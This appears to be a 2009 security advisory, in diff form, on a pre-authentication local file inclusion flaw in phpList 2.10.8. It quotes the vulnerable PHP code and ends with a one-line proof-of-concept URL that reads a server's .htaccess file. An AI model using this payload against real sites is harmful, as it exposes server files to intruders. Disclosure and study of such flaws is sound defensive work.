@@ -1,0 +1,79 @@
+########################## www.BugReport.ir #########################
+#
+#      AmnPardaz Security Research Team
+#
+# Title: phpList Local File inclusion
+# Vendor: http://www.phplist.com
+# Bug: Local File Inclusion
+# Vulnerable Version: 2.10.8 (prior versions also may be affected)
+# Exploitation: Remote with browser
+# Fix: N/A
+# Original Advisory: http://www.bugreport.ir/index_60.htm
+###################################################################
+
+
+####################
+- Description:
+####################
+
+Quote From vendor:"phplist is an open-source newsletter manager. phplist is free to download, install and use, and is easy to integrate with any website.
+phplist is downloaded more than 10 000 times per month and is listed in the top open source projects for vitality score on Freshmeat.
+phplist is sponsored by tincan."
+
+
+####################
+- Vulnerability:
+####################
+
++--> Local File Inclusion
+
+Because of the vulnerability in "admin/index.php", When "register_globals" is disabled (Default PHP Configuration) It is possible for remote attackers to
+include arbitrary files from local resources before performing authentication.
+
+Code Snippet:
+/lists/admin.php #line:10-18
+
+if (!ini_get("register_globals") || ini_get("register_globals") == "off") {
+  # fix register globals, for now, should be phased out gradually
+  # sure, this gets around the entire reason that regLANGUAGE_SWITCHister globals
+  # should be off, but going through three years of code takes a long time....
+
+  foreach ($_REQUEST as $key => $val) {
+    $$key = $val;
+  }
+}
+
+/lists/admin.php #line:41-56
+
+if (isset($_SERVER["ConfigFile"]) && is_file($_SERVER["ConfigFile"])) {
+  print '<!-- using '.$_SERVER["ConfigFile"].'-->'."\n";
+  include $_SERVER["ConfigFile"];
+} elseif (isset($cline["c"]) && is_file($cline["c"])) {
+  print '<!-- using '.$cline["c"].' -->'."\n";
+  include $cline["c"];
+} elseif (isset($_ENV["CONFIG"]) && is_file($_ENV["CONFIG"])) {
+#  print '<!-- using '.$_ENV["CONFIG"].'-->'."\n";
+  include $_ENV["CONFIG"];
+} elseif (is_file("../config/config.php")) {
+  print '<!-- using ../config/config.php -->'."\n";
+  include "../config/config.php";
+} else {
+  print "Error, cannot find config file\n";
+  exit;
+}
+
+####################
+- POC:
+####################
+
+http://www.example.com/lists/admin/index.php?_SERVER[ConfigFile]=../.htaccess
+
+####################
+- Credit:
+####################
+AmnPardaz Security Research Team
+Contact: admin[4t}bugreport{d0t]ir
+www.BugReport.ir
+www.AmnPardaz.com
+
+# milw0rm.com [2009-01-14]
